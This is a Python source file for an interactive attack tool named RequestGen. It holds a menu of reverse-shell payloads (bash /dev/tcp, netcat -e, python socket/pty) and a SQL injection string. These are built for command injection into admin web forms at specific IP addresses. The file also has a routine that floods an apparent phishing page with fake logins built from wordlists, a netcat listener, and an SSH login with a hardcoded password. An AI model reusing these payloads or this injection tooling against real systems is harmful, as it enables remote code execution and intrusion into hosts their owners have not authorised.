from os import system, name
from time import sleep
import random
import requests
import json
import webbrowser
import urllib.parse
import subprocess

def clear():
        if name == 'nt':
            _=system('cls')
        else:
            _=system('clear')

def menu_maker(menu):
        counter=0
        while counter < len(menu):
            print('[{}]'.format(counter),menu[counter])
            counter = counter + 1

def run_command():
    clear()
    global port_number, menu
    menu = ['Reverse Shell Listener', 'SSH Login']
    menu_maker(menu)
    option1 = input("\n    Choice:  ")
    clear()
    
    command_dictionary ={
        '0':"subprocess.run(['nc','-nlvp',port_number])",
        '1':"subprocess.run(['sshpass','-p','SuPeRSeCrEt','ssh','ez@107.172.29.202'])",
    }

    if option1 == '0':
        port_number = input('\nEnter listener PORT:  ')

    eval(command_dictionary[option1])

# Holds content to build various POST requests
class Request_Builder():

    def Remote_System_Admin(self):
        global url, header, body, shell_command
        url = 'http://10.8.0.9:8080'
        header = {
            "Host": "10.8.0.9:8080",
            "Content-Length": "43",
            "Cache-Control":"max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "http://10.8.0.9:8080",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Referer":"http://10.8.0.9:8080/index.php",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"en-US,en;q=0.9",
            "Connection": "close",
        }
        body = {
            # "ip":"",
            # "submit":"submit",
            "uname":"user",
            "psw":"password",
            "btnLogin":"Login"
        }
        form_url = '/index.php?uname={}&psw={}&btnLogin={}'
        body['psw'] = shell_command
        # url = url + form_url.format(body["uname"],body['psw'],body["btnLogin"])



    def EzsAdmin(self):
        global url, header, body, shell_command
        url = 'http://107.172.29.202'
        header = {
            "Upgrade-Insecure-Requests": "1",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Referer":"http://107.172.29.202/console/view.php",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"en-US,en;q=0.9",
            "Cookie":"_ga=GA1.1.872612127.1626297345; _gid=GA1.1.317299302.1626297345",
            "Connection": "close",
        }
        body = {
            "AdminName":'',
            "AdminID":'',
            "filename":'',
        }
        admin_name = ''
        admin_id = ''
        filename = ''
        filename = shell_command
        form_url = '/console/view.php?AdminName={}&AdminID={}&filename={}&submit=Submit+Query'
        url = url + form_url.format(admin_name,admin_id,filename)



    def phishing_counter(self):
        global url, header, body
        url = 'https://redacted.com/4333/log.php'
        header = {
            "Accept-Encoding": "gzip,deflate,br",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "[redacted].com",
            "Origin": "[redacted]",
            "Refer": "[redacted]",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5",
            "Accept": "text/html, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Length": "12",
        }
        body = {
            "u":'',
            "p":'',
        }
Construct_Header = Request_Builder()

# Constructs random email/passwords.
class Login_Builder():
    def __init__(self):
        # clear()
        global email_list, password_list, payload_list
        self.first_name_list = []
        self.last_name_list = []
        email_list = []
        password_list = []
        payload_list = []
        self.first_names = {"field":"first_name", "file":'./wordlist/first_names.txt', "encoding":"UTF-8", "payload":self.first_name_list}
        self.last_names = {"field":"last_name", "file":'./wordlist/last_names.txt', "encoding":"ISO-8859-1", "payload":self.last_name_list}
        self.email_extensions = {"field":"email_extension", "file":'./wordlist/email_extensions.txt', "encoding":"UTF-8", "payload":email_list}
        self.passwords = {"field":"password", "file":'/home/charles/Downloads/rockyou.txt', "encoding":"ISO-8859-1", "payload":password_list}
        self.master_dictionary=[self.first_names, self.last_names, self.email_extensions, self.passwords]


    def payload_builder(self):
        global count, email_list, password_list, payload_list, delay, min_sleep, max_sleep

        choice = input("\nDelay between sending logins?   (y/n):  ")
        if choice == 'y':
            delay = True
            min_sleep = int(input("\nMinimum time to wait (seconds):  "))
            max_sleep = int(input("Maximum time to wait (seconds):  "))
        print("\nBuilding Attack Lists....\n")
        count = int(input("\nHow many requests should I send?   "))

        for item in self.master_dictionary:
            # open file and set the encoding type
            with open(item["file"],encoding = item["encoding"]) as f:
                lines = f.readlines()
                for i in range(count):
                    #Creates a name variable dynamically from the current field name by using a dictionary key
                    globals()[item["field"]] = random.choice(lines)
                    #.rstrip() removes line breaks
                    string = globals()[item["field"]].rstrip()
                    #capitilize the string if it is the beginning of a first/last name
                    if item["field"] == "first_name" or item["field"] == "last_name":
                        string = string.title()
                    item["payload"].append(string)

        for i in range(count):        
            username = self.first_name_list[i] + self.last_name_list[i] + email_list[i]
            password = password_list[i]
            payload_list.append({'u':username, 'p':password})
Construct_Login = Login_Builder()

# Sends POST requests from supplied request data.
class Request_Sender():
    def post_request_sender(self):
        self.delay = False
        global count, url, header, body, payload_list, min_sleep, max_sleep

        for i in range(count):
            if payload_list:
                body = payload_list[i]
            r = requests.post(url=url, headers=header ,data=json.dumps(body))

            print("\n\n",r,"\n\n",url,"\n\n",body,"\n\n",r.content)

            # Check if counter for multiple requests is set
            if count > 1:
                print("\nLogin ", i)
                # print(body)
                if delay == True:
                    sleep(random.randint(min_sleep,max_sleep))
            
            webbrowser.open(url, new=0, autoraise=True)
Construct_Request = Request_Sender()

# Constructs various payloads.
class Payloads():
    def __init__(self):
        global shell_command, ip_address, port_number
        # Constructing a dictionary to run the menu and generate payloads
        self.command_dictionary = {
            # Bash reverse shell commands
            "0":{
                # Bash TCP shells
                "1":";bash -i >& /dev/tcp/{}/{} 2>&1",
                "2":";0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196",
                "3":";/bin/bash -l > /dev/tcp/{}/{} 0<&1 2>&1",
                # Bash UDP shells
                "4":";sh -i >& /dev/udp/{}/{} 2>&1",
                },
            # Netcat reverse shell commands
            "1":{
                "1":';nc -e /bin/bash {} {} 2>&1',
                "2":';nc -e /bin/sh {} {} 2>&1',
                "3":';nc -c bash {} {} 2>&1',
            },
            # Python reverse shell commands
            "2":{
                "1":";export RHOST='{}';export RPORT={};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv('RHOST'),int(os.getenv('RPORT'))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')'",
                "2":";python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({},{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')'"
            },
            # Python file server
            "3":{
                "1":";python3 -m http.server 8083",
                "2":";python3 -m SimpleHTTPServer 8083",
            },
            # SQL Injection
            "4":{
                "1":"'or'1=1"
            }
        }

    def ip_port(self):
        clear()
        global shell_command, ip_address, port_number
        ip_address = input('\nEnter listener IP:  ')
        port_number = input('Enter listener PORT:  ')

    def command_constructor(self):
        global shell_command, ip_address, port_number, body
        clear()
        # Build options menu with a list and while loop to print it's contents
        menu = ['Bash','Netcat','Python','File Server','SQL Injection']
        menu_maker(menu)
        option1 = input("\n    Choice:  ")
        clear()

        # Display dictionary key names and their values
        for key, value in self.command_dictionary[option1].items():
            print ('    [{}]'.format(key), value.format(ip_address, port_number))

        option2 = input('\n    Choice:  ')
        # shell_command = urllib.parse.quote(self.command_dictionary[option1][option2].format(ip_address, port_number))
        shell_command = self.command_dictionary[option1][option2].format(ip_address, port_number)
Construct_Payload = Payloads()

# Runs on script execution. Calls the other classes and functions accordingly.
class Main_App():
    clear()
    def __init__(self):
        global count
        count = 1
        print("   **********************\n         RequestGen\n   **********************\n")

        menu = ['Login Flooder',"Remote System Admin (10.8.0.9)", "EZ's Admin Command (107.172.29.202)", "Other Commands"]
        menu_maker(menu)
        choice = input("\n    Choice:  ")

        if choice == '0':
            Construct_Header.phishing_counter()
            Construct_Login.payload_builder()

        elif choice =='1':
            Construct_Payload.ip_port()
            Construct_Payload.command_constructor()
            Construct_Header.Remote_System_Admin()
            
        elif choice =='2':
            Construct_Payload.ip_port()
            Construct_Payload.command_constructor()
            Construct_Header.EzsAdmin()

        elif choice =='3':
            run_command()

        # Construct_Request.post_request_sender()
Main_App()